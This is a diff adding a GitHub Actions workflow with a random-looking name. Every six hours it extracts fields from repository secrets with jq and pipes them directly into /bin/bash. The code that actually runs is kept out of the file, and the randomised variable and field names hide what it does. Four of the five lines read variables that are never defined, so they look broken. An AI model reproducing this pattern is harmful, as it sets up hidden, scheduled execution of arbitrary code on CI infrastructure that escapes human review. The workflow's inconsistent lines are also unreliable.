@@ -1,0 +1,21 @@
+name: qiangdadekuaii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qiangdadekuaii
+        env:
+          ypdpg6: ${{ secrets.ypdpg6 }}
+        run: |
+          echo $ypdpg6 | jq -r .cb7654 | /bin/bash
+          echo $ox53686 | jq -r .nscx240 | /bin/bash
+          echo $p84375 | jq -r .xeo94581 | /bin/bash
+          echo $fyyak67 | jq -r .isev69 | /bin/bash
+          echo $phgz2 | jq -r .wbhx91063 | /bin/bash
+
